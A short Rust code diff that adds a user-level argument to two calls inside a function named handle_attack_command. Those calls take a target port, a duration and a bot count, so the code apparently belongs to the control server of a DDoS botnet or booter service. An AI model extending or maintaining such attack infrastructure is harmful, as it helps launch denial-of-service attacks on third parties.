@@ -105,6 +105,7 @@ pub async fn handle_attack_command(client: &Arc<Client>, state: &Arc<AppState>, 
         port,
         duration,
         client.user.username.clone(),
+        client.user.get_level(),
         bot_count
     ).await {
         Ok(attack_id) => {
@@ -129,6 +130,7 @@ pub async fn handle_attack_command(client: &Arc<Client>, state: &Arc<AppState>, 
                     port,
                     duration,
                     client.user.username.clone(),
+                    client.user.get_level(),
                     bot_count
                 ).await {
                     Ok(pos) => {
